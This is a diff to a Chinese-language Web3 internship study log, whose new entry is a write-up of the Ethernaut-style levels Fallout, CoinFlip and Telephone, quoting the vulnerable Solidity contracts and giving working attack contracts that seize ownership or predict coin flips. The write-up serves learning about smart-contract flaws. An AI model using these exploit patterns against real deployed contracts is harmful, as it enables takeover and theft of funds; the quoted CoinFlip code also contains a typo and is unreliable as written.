@@ -15,8 +15,292 @@ Web3 实习计划 2025 冬季实习生
 ## Notes
 
 <!-- Content_START -->
+# 2026-01-22
+<!-- DAILY_CHECKIN_2026-01-22_START -->
+以太航员  
+
+\# fallout
+
+\`\`\`solidity
+
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.6.0;
+
+import "openzeppelin-contracts-06/math/SafeMath.sol";
+
+contract Fallout {
+
+using SafeMath for uint256;
+
+//把 SafeMath 库里所有 以 uint256 作为第一个参数 的函数，“挂”到 uint256 类型
+
+之后写 x.add(y) 就能自动转成 SafeMath.add(x, y) ，防止加减乘除溢出。
+
+mapping(address => uint256) allocations;
+
+address payable public owner;
+
+/\* constructor \*/
+
+function Fal1out() public payable {
+
+owner = msg.sender;
+
+allocations\[owner\] = msg.value;
+
+}
+
+modifier onlyOwner() {
+
+require(msg.sender == owner, "caller is not the owner");
+
+\_;
+
+}
+
+function allocate() public payable {
+
+allocations\[msg.sender\] = allocations\[msg.sender\].add(msg.value);
+
+}
+
+function sendAllocation(address payable allocator) public {
+
+require(allocations\[allocator\] > 0);
+
+allocator.transfer(allocations\[allocator\]);
+
+}
+
+function collectAllocations() public onlyOwner {
+
+msg.sender.transfer(address(this).balance);
+
+}
+
+function allocatorBalance(address allocator) public view returns (uint256) {
+
+return allocations\[allocator\];
+
+}
+
+}
+
+\`\`\`
+
+该关卡的要求是获取合约的owner
+
+\`\`\`solidity
+
+/\* constructor \*/
+
+function Fal1out() public payable {
+
+owner = msg.sender;
+
+allocations\[owner\] = msg.value;
+
+}
+
+\`\`\`
+
+构造函数名称与合约名称不一致使其成为一个public类型的函数，即任何人都可以调用，同时在构造函数中指定了函数调用者直接为合约的owner，所以我们可以直接调用构造函数Fal1out来获取合约的ower权限。
+
+\# CoinFlip
+
+\`\`\`solidity
+
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+contract CoinFlip {
+
+uint256 public consecutiveWins;
+
+uint256 lastHash;
+
+uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+constructor() {
+
+consecutiveWins = 0;
+
+}
+
+function flip(bool \_guess) public returns (bool) {
+
+uint256 blockValue = uint256(blockhash(block.number - 1));
+
+if (lastHash == blockValue) {
+
+revert();
+
+}
+
+lastHash = blockValue;
+
+uint256 coinFlip = blockValue / FACTOR;
+
+bool side = coinFlaip == 1 ? true : false;
+
+if (side == \_guess) {
+
+consecutiveWins++;
+
+return true;
+
+} else {
+
+consecutiveWins = 0;
+
+return false;
+
+}
+
+}
+
+}
+
+\`\`\`
+
+抛硬币 游戏合约，
+
+游戏逻辑（理想版）
+
+用上一区块的哈希 blockhash(block.number-1) 做随机源
+
+哈希除以一个大数 FACTOR ，把最高位挤出来当 0/1
+
+猜对了 consecutiveWins++ ，猜错清零
+
+但是blockhash可预测
+
+\`\`\`solidity
+
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import './CoinFlip.sol';
+
+contract Hack {
+
+CoinFlip public immutable target;
+
+uint256 private constant FACTOR =
+
+57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+constructor(address \_target) {
+
+target = CoinFlip(\_target);
+
+}
+
+/// 必须在新区块里调用，否则 revert
+
+function attack() external {
+
+uint256 blockValue = uint256(blockhash(block.number - 1));
+
+require(blockValue != 0, "block too early");
+
+uint256 coinFlip = blockValue / FACTOR;
+
+bool side = coinFlip == 1;
+
+target.flip(side); // 百发百中
+
+}
+
+}
+
+\`\`\`
+
+\# Telephone
+
+\`\`\`solidity
+
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+contract Telephone {
+
+address public owner;
+
+constructor() {
+
+owner = msg.sender;
+
+}
+
+function changeOwner(address \_owner) public {
+
+if (tx.origin != msg.sender) {
+
+owner = \_owner;
+
+}
+
+}
+
+}
+
+\`\`\`
+
+让msg.sender与tx.origin不相同即可，使用合约就可以实现。
+
+\+ `tx.origin` 是发起整个交易的外部账户（钱包地址）。
+
+\+ `msg.sender` 是当前调用者（可能是合约或外部账户）。
+
+如果情景是直接由钱包调用合约，两者相同 ，但是如果是在多个合约的情况下，比如用户通过b合约来调用a合约，那么对于a合约来说，msg.sender就代表合约b，而tx.origin就代表用户钱包地址，所以我们这里需要另外部署一个合约来调用这儿的changeOwner：
+
+\`\`\`solidity
+
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import './Telephone.sol';
+
+contract exp{
+
+Telephone public immutable target;
+
+address public owner;
+
+constructor(){
+
+owner = msg.sender;
+
+//在 Solidity 中`msg.sender` 表示当前调用这个函数的实体；
+
+//所以这里 \`msg.sender
+
+//会是你的钱包地址；因此构造函数执行时，将部署者地址写入 owner
+
+target=Telephone(0x3d79CEeF1F3665587D4D20F1f2030C4aC097c1E9);//目标合约地址
+
+}
+
+function attack() public {
+
+target.changeOwner(owner);
+
+}
+
+}
+
+\`\`\`
+<!-- DAILY_CHECKIN_2026-01-22_END -->
+
 # 2026-01-21
 <!-- DAILY_CHECKIN_2026-01-21_START -->
+
 ai与web3
 
 主题围绕 AI Agent（智能体）与 Web3 的结合，重点阐述了为什么 AI 需要 Web3 基础设施（身份、支付、可验证性），以及 SpoonOS 如何通过协议层（X402, C8004）和应用层解决这些问题。
@@ -62,6 +346,7 @@ C8004 标准 (Identity)：AI 的“链上护照”。基于 ERC-721 实现，包
 
 # 2026-01-20
 <!-- DAILY_CHECKIN_2026-01-20_START -->
+
 
 现在的WEB3生态，已经不是一个简单的比特币网络了，它演化成了一个庞大复杂的数字国家。我们可以用分层的方式来拆解它，就像理解一个城市的：地基、公路、水电煤、商业区。
 
@@ -170,6 +455,7 @@ DAO是通过代码设定规则的公司或社区。成员通过持有代币进�
 <!-- DAILY_CHECKIN_2026-01-19_START -->
 
 
+
 \## 脚本
 
 \### 一、本质
@@ -255,6 +541,7 @@ OP\_DUP OP\_HASH160 <20字节 pubkeyhash> OP\_EQUALVERIFY OP\_CHECKSIG
 
 # 2026-01-16
 <!-- DAILY_CHECKIN_2026-01-16_START -->
+
 
 
 
@@ -351,6 +638,7 @@ OP\_DUP OP\_HASH160 <20字节 pubkeyhash> OP\_EQUALVERIFY OP\_CHECKSIG
 
 # 2026-01-15
 <!-- DAILY_CHECKIN_2026-01-15_START -->
+
 
 
 
@@ -479,6 +767,7 @@ OP\_DUP OP\_HASH160 <20字节 pubkeyhash> OP\_EQUALVERIFY OP\_CHECKSIG
 
 
 
+
 \# 钱包地址生成逻辑
 
 !\[\[图库/dfa1465c6710908114e7c40bbffa7e06\_MD5.jpg\]\]
@@ -580,6 +869,7 @@ MetaMask 支持：
 
 # 2026-01-13
 <!-- DAILY_CHECKIN_2026-01-13_START -->
+
 
 
 
@@ -735,6 +1025,7 @@ L2 将大量计算从 L1 挪到链外，但最终结果仍必须通过 L1 验证
 
 # 2026-01-12
 <!-- DAILY_CHECKIN_2026-01-12_START -->
+
 
 
 
